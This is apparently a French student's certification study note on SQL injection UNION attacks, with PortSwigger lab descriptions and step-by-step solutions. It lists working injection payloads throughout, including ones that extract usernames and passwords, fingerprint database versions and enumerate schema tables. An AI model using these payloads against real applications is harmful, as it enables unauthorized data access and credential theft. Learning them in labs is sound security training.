---
tags:
  - bscp
  - server-side
  - sql-injection
niveau: practitioner
statut: à faire
---
# SQL-injection-Union-Attacks

## En bref
- Elle s'applique quand l'application est vulnérable à l'injection SQL et que les résultats de la requête sont renvoyés dans ses réponses.
- Le mot clé `UNION` permet d'extraire des données d'autres tables de la base.
- Il permet d’exécuter une ou plusieurs requêtes `SELECT` supplémentaires et d’ajouter leurs résultats à ceux de la requête d’origine.
- Exemple: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`.
- Cette requête renvoie un seul jeu de résultats à deux colonnes, contenant les valeurs de `a` et `b` (table1) et celles de `c` et `d` (table2).

## Types et variantes
- 

## Comment détecter
- 

## Comment exploiter (principe)
- Pour qu'elle puisse fonctionner, deux conditions essentielles doivent être remplies:
	- Les requêtes individuelles doivent renvoyer le même nombre de colonnes.
	- Les types de données de chaque colonne doivent être compatibles entre les différentes requêtes.
- Cela implique également de déterminer:
	- Le nombre de colonnes renvoyées par la requête d'origine.
	- Quelles colonnes renvoyées par la requête d'origine ont un type de données adapté pour contenir les résultats de la requête injectée.
### Détermination du nombre de colonnes requises (Méthode order by)
- Lors d’une injection SQL UNION, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d’origine. Ce texte détaille la première.
- Principe : injecter une série de clauses `ORDER BY` en incrémentant l’index de colonne jusqu’à ce qu’une erreur se produise.
**Charges utiles**
- Si le point d'injection est une chaîne entre guillemets dans la clause `WHERE` on envoie donc:
	- `' ORDER BY 1--`
	- `' ORDER BY 2--`
	- ' `ORDER BY 3--`
	- et ainsi de suite
- Chaque charge utile trie les résultats selon une colonne différente du jeu de résultats.
- La colonne peut être désignée par son index : il n’est pas nécessaire de connaître les noms des colonnes.
- Quand l’index dépasse le nombre réel de colonnes, la base renvoie une erreur (exemple : la position n° 3 de la clause `ORDER BY` est hors de la plage de la liste de sélection.
### Lecture de la réponse
- L'application peut renvouer l'erreur de la base dans la réponse HTTP, une erreur générique, ou simplement aucun résultat.
- Tant qu’une différence dans la réponse est détectable, on peut en déduire le nombre de colonnes (la dernière valeur d’index qui n’a pas provoqué d’erreur).
### Détermination du nombre de colonnes requises (Méthode union select null)
- Seconde méthode: envoyer une série de charges utiles `UNION SELECT` avec un nombre croissant de valeur `NULL`
- Charges utiles:
	- `' UNION SELECT NULL--`
	- `' UNION SELECT NULL,NULL--`
	- `' UNION SELECT NULL,NULL,NULL--`
	- et ainsi de suite
- Lecture des erreurs
	- Si le nombre de `NULL` ne correspond pas au nombre de colonnes, la base renvoie une erreur (exemple : toutes les requêtes combinées par `UNION`, `INTERSECT` ou `EXCEPT` doivent avoir le même nombre d’expressions dans leur liste cible).
	- Comme pour le `ORDER BY`, l’application peut renvoyer l’erreur de la base, une erreur générique, ou simplement aucun résultat.
- Pourquoi utiliser `NULL` ?
	- `NULL` est convertible vers tous les types de données courants, ce qui maximise les chances de réussite quand le nombre de colonnes est correct.
- Quand le nombre de `NULL` est correct
	- La base renvoie une ligne supplémentaire dans le jeu de résultats, avec des valeurs nulles dans chaque colonne.
	- L’effet sur la réponse HTTP dépend du code de l’application.
		- Cas favorable : du contenu supplémentaire apparaît, par exemple une ligne en plus dans un tableau HTML.
		- Autre cas : les valeurs nulles déclenchent une autre erreur, comme une `NullPointerException`.
		- Pire cas : la réponse ressemble à celle d’un mauvais nombre de `NULL`, ce qui rend la méthode inefficace.
## Syntaxe propre à chaque base de données
**Oracle**
- Toute requête `SELECT` doit utiliser le mot-clé `FROM` et préciser une table valide.
- Oracle fournit une table intégrée, `dual`, utilisable à cet effet.
- Les requêtes injectées doivent donc ressembler à : `' UNION SELECT NULL FROM DUAL--`

**MySQL**
- Les charges utiles décrites utilisent la séquence de commentaire `--` pour neutraliser la fin de la requête d’origine après le point d’injection.
- Sur MySQL, `--` doit être suivi d’un espace.
- Alternative : le caractère `#` permet aussi d’indiquer un commentaire.

**Astuce pratique**
- Dans une URL, l’espace après `--` s’écrit `+` ou `%20`, et `#` doit être encodé en `%23` (information de ma connaissance générale, non issue de votre texte).
## Trouver les colonnes avec un type de données utile
- Une attaque UNION permet de récupérer les résultats d’une requête injectée.
- Les données intéressantes sont normalement sous forme de chaîne : il faut donc trouver une ou plusieurs colonnes dont le type est, ou est compatible avec, des données de type chaîne.

**Méthode**
- Une fois le nombre de colonnes déterminé, on teste chaque colonne pour savoir si elle accepte une chaîne.
- On envoie une série de charges utiles `UNION SELECT` qui placent une chaîne dans chaque colonne tour à tour.
- Exemple avec quatre colonnes :
	- `' UNION SELECT 'a',NULL,NULL,NULL--`
	- `' UNION SELECT NULL,'a',NULL,NULL--`
	- `' UNION SELECT NULL,NULL,'a',NULL--`
	- `' UNION SELECT NULL,NULL,NULL,'a'--`
**Lecture du résultat**
- Colonne incompatible avec une chaîne : la requête injectée provoque une erreur de base de données (exemple : échec de conversion de la valeur varchar ‘a’ vers le type de données int).
- Aucune erreur et réponse contenant du contenu supplémentaire avec la chaîne injectée : la colonne convient pour récupérer des données de type chaîne.
## Récupérer des données intéressantes avec une injection SQL UNION**
- Une fois le nombre de colonnes déterminé et les colonnes de type chaîne identifiées, on peut récupérer des données intéressantes.
- Exemples:
	- La requête d’origine renvoie deux colonnes, toutes deux compatibles avec des chaînes.
	- Le point d’injection est une chaîne entre guillemets dans la clause `WHERE`.
	- La base contient une table `users` avec les colonnes `username` et `password`.
**Charge utile**
- Le contenu de la table `users` s’obtient avec : `' UNION SELECT username, password FROM users--`
**Prérequis**
- Il faut connaître le nom de la table (`users`) et de ses colonnes (`username`, `password`).
- Sans cette information, il faut deviner les noms des tables et des colonnes.
- Toutes les bases modernes offrent des moyens d’examiner leur structure et de savoir quelles tables et colonnes elles contiennent
## Récupérer plusieurs valeurs dans une seule colonne
- Dans certains cas, la requête d’origine ne renvoie qu’une seule colonne.
- On peut alors récupérer plusieurs valeurs ensemble dans cette colonne en les concaténant.
- On peut inclure un séparateur pour distinguer les valeurs combinées.

**Exemple sur Oracle**
- Charge utile : `' UNION SELECT username || '~' || password FROM users--`
- `||` (double barre verticale) est l’opérateur de concaténation de chaînes sur Oracle.
- La requête injectée concatène `username` et `password`, séparés par le caractère `~`.

**Résultat obtenu**
- La réponse contient tous les identifiants sous la forme `utilisateur~mot_de_passe`, par exemple :
    - `administrator~s3cure`
    - `wiener~peter`
    - `carlos~montoya`

 **Point clé**
- Chaque base de données utilise une syntaxe différente pour la concaténation.
- Pour les détails, consulter le cheat sheet de l’injection SQL de PortSwigger.
## Analyse de la base de données
- Il est souvent nécessaire de recueillir des informations sur la base de données. Cela peut comprendre:
	- Le type et la version de la base de données.
	- Les tables et le contenues dans les base de données.
### Interroger le type et la version de la base de données
- On peut identifier le type et la version de la base en injectant des requetes propres à chaque fournisseur, puis en vérifiant laquelle fonctionne.

**Requêtes selon la base**

| Type de base de données | Requête                  |
| ----------------------- | ------------------------ |
| Microsoft, MySQL        | `SELECT @@version`       |
| Oracle                  | `SELECT * FROM v$version` |
| PostgreSQL              | `SELECT version()`       |

**Exemple**
- Charge utile UNION : `' UNION SELECT @@version--`
- Le résultat peut afficher la version complète, par exemple : `Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)`.
- Dans ce cas, on confirme que la base est Microsoft SQL Server et on connaît sa version.

**Rappel pratique**
- Cette requête doit respecter les contraintes vues plus haut : bon nombre de colonnes et colonne compatible avec une chaîne (par exemple `' UNION SELECT @@version,NULL--` si la requête d’origine a deux colonnes).
- Sur Oracle, il faut ajouter `FROM DUAL` quand la requête ne cible pas de table, mais `SELECT * FROM v$version` cible déjà une table. On cherchera plutôt à récupérer la colonne `banner` : `' UNION SELECT banner,NULL FROM v$version--`
## Afficher le contenu de la base de données
- La plupart des types de bases de données, sauf Oracle, disposent d’un ensemble de vues appelé schéma d’information, qui fournit des informations sur la base.
### Lister les tables
- Requête : `SELECT * FROM information_schema.tables`
- Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `TABLE_TYPE`.
- Dans l’exemple, la sortie révèle trois tables : `Products`, `Users` et `Feedback`.
### Lister les colonnes d'une table
- Requête : `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`.
- Dans l’exemple, la table `Users` contient `UserId` (int), `Username` (varchar) et `Password` (varchar).
### Lien avec l'attaque UNION
- Cela répond au prérequis vu plus haut : connaître les noms de tables et de colonnes avant de lancer `' UNION SELECT username, password FROM users--`.
- En pratique, via une injection UNION, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes, par exemple `' UNION SELECT table_name,NULL FROM information_schema.tables--` (information de ma connaissance générale, non issue de votre texte).


**Référence**: 
## Pièges et points d'attention BSCP
- 

## Prévention
- 

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-26
- [ ] Practitioner
- [ ] Expert

## Journal des labs
### Lab: SQL injection UNION attack, determining the number of columns returned by the query
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables. La première étape d'une telle attaque consiste à déterminer le nombre de colonnes renvoyées par la requête. Vous utiliserez ensuite cette technique dans les laboratoires suivants pour mettre au point l'attaque complète.

Pour résoudre cet exercice, déterminez le nombre de colonnes renvoyées par la requête en effectuant une attaque par injection SQL de type UNION qui renvoie une ligne supplémentaire contenant des valeurs nulles.
#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
    
    `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
### Lab: SQL injection UNION attack, finding a column containing text
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque UNION pour extraire des données d'autres tables. Pour mettre en place une telle attaque, vous devez d'abord déterminer le nombre de colonnes renvoyées par la requête. Vous pouvez y parvenir à l'aide d'une technique que vous avez apprise lors d'un laboratoire précédent. L'étape suivante consiste à identifier une colonne compatible avec les données de type chaîne de caractères.

Le laboratoire vous fournira une valeur aléatoire que vous devrez faire apparaître dans les résultats de la requête. Pour résoudre cet exercice, effectuez une attaque par injection SQL de type UNION qui renvoie une ligne supplémentaire contenant la valeur fournie. Cette technique vous aide à déterminer quelles colonnes acceptent les données de type chaîne de caractères.
#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the `category` parameter:
    `'+UNION+SELECT+NULL,NULL,NULL--`
3. Try replacing each null with the random value provided by the lab, for example:
    
    `'+UNION+SELECT+NULL,'abcdef',NULL--`
1. If an error occurs, move on to the next null and try that instead.
## Lab: SQL injection UNION attack, retrieving data from other tables
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque UNION pour extraire des données d'autres tables. Pour mettre en place une telle attaque, vous devez combiner certaines des techniques apprises lors des laboratoires précédents.

La base de données contient une autre table nommée « users », comportant des colonnes intitulées « username » et « password ».

Pour résoudre cet exercice, lancez une attaque par injection SQL de type UNION permettant de récupérer tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.
### Lab: SQL injection UNION attack, retrieving multiple values in a single column
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables.

La base de données contient une autre table nommée « users », comportant des colonnes intitulées « username » et « password ».

Pour réussir ce laboratoire, effectuez une attaque de type injection SQL UNION permettant d'extraire tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.
#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+username,+password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.
#### **Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'#`
3. Use the following payload to display the database version:
    
    `'+UNION+SELECT+@@version,+NULL#`

## Lab: SQL injection attack, listing the database contents on non-Oracle databases
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.
#### Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.
## Liens
- [[Access-control]]
- [[Authentication]]
- [[Using-Burp-Suite]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
